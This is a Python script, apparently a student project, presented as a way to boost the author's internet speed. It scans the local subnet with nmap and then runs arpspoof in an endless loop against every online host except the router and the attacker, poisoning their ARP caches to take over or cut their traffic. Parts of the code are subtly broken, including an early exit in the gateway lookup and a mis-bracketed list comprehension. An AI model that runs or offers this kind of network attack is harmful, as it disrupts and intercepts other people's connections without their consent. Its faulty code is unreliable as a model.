"""
Authors: Noam Cohen & Ron Hodadedi
Purpose: Increasing our internet speed.
Description:
Note: This is the main file of the project.
"""


import optparse
import nmap
import os
import subprocess
import sys
import time


def get_def_gate(interface):
    """
    The function receives the interface as a parameter,
    and return us the default gateway of IP.
    :param: interface: The network interface we want to speed up.
    :return: default gateway IP.
    """
    # This command in windows: 'route PRINT'
    # put in data all the output of 'route -n' command
    data = os.popen("/sbin/route -n").readlines()

    # Go over each line on data:
    for line in data:
        # If the line starts with '0.0.0.0',
        # and our interface is exists at the end of the line:
        if line.startswith("0.0.0.0") and (interface in line):
            # Then prints & return the default gateway:
            print("Default Gateway: " + line.split()[1])
            return line.split()[1]
        # Else:
        print("Error! Default gateway was not found")
        sys.exit(0)


def get_host_ip(interface):
    """
    The function receives the interface as a param,
    and return us the network address in CIDR notation,
    and the host IP address
    :param interface: The network interface we want to speed up.
    :return: network address in CIDR notation, host IP address
    """
    # Define two variables we will need after that:
    ip: str = ""
    mask: str = ""

    # Put in data all the output of 'ifconfig [interface]' command:
    data = os.popen("ifconfig " + interface).readlines()

    # Go over each line on data:
    for line in data:
        # Strip() method deletes white chars (spaces) from the beginning and the end of the line:
        if line.strip().startswith("inet "):
            # Take the IP address:
            ip = line.strip().split()[1]
            # Take the netmask of this network:
            mask = line.strip().split()[3]

    # If ip or mask are empty strings:
    if ip == "" or mask == "":
        # Then we have an error
        # (maybe the 'ifconfig' cmd didn't work and the code didn't find a line starting with 'inet'):
        print("Error. Unable to find default IP")
        sys.exit(0)

    # Else, if they are not empty:
    else:
        # Then:
        ip_address = ip.split('.')
        netmask = mask.split('.')

        # ANDing IP and NETMASK byte by byte:
        net_start = [str(int(ip_address[i]) & int(netmask[i]) for i in range(0, 4))]
        binmask = ''.join([bin(int(octet))[2:].zfill(8) for octet in netmask])
        prefix_len = str(len(binmask.rstrip('0')))
        return '.'.join(net_start) + "/" + prefix_len, ip


def get_online_hosts(network, exclusion):
    """
    Input the network address in CIDR notation,
    and a list of IPs to be excluded.
    Return a list of hosts that are online.
    :param network: network address in CIDR notation.
    :param exclusion: list of IPs to be excluded.
    :return: list of hosts that are online.
    """

    # Instantiate a PortScanner object:
    nm = nmap.PortScanner()
    # Scan the target ports:
    nm.scan(hosts=network, arguments='-n -sP -PE -PA21,23,80,3389')
    # Put in hosts only the hosts that are online:
    hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
    # "Remove" from hosts all the IPs to be excluded:
    hosts = list(set(hosts) - set(exclusion))

    # Prints all the hosts that are online:
    print("Hosts up: ")
    for host in hosts:
        print(host, end="\n")

    return hosts


def stop_process(processes):
    for p in processes:
        p.terminate()


def arp_spoofing(victims, def_gateway, interface):
    """
    The function receives a list of IP addresses to be victims,
    Default gateway, and interface on which this network is connected,
    and implementing an ArpSpoofing attack
    :param victims: list of IP addresses to be victims.
    :param def_gateway: Default gateway.
    :param interface: interface on which this network is connected.
    :return:
    """
    processes = []

    try:
        # Get over on each victim IP
        for v in victims:
            # Indicates we get start to implement ArpSpoofing on the current victim:
            print("starting to arpSpoof from " + def_gateway + " to " + v)
            # Adding a child process that implementing the ArpSpoofing on the current victim:
            processes.append(
                subprocess.Popen("sudo arpspoof " + def_gateway + " -i " + interface + " -t " + v, shell=True))
        time.sleep(100)

    except KeyboardInterrupt:
        stop_process(processes)
        sys.exit(0)

    stop_process(processes)


def main():
    # Parsing command-line options:
    parser = optparse.OptionParser("sudo python %prog")

    # Adding two options:
    # The network interface we want to speed up:
    parser.add_option('-i', '--interface', dest='interface', type='string', default='eth0')
    # specify IP address[es] to be excluded seperated by comma:
    parser.add_option('-e', '--exclude', dest='exclude', type='string')

    # Once all of our options are defined,
    # instruct optparse to parse program’s command line:
    (options, args) = parser.parse_args()

    interface = options.interface

    if options.exclude is None:
        exclusion = list()

    else:
        exclusion = options.exclude.split(',')

    # Put in router the default gateway:
    router = get_def_gate(interface)
    # Get the network address in CIDR notation and the host IP:
    network, ip = get_host_ip(interface)
    # Add our host to the exclusion list:
    exclusion += [router, ip]

    # Don't stop ever!! (-;
    while True:
        # Get only the hosts that are online:
        hosts = get_online_hosts(network, exclusion)
        # Call to ArpSpoofing attack:
        arp_spoofing(hosts, router, interface)


if __name__ == "__main__":
    main()
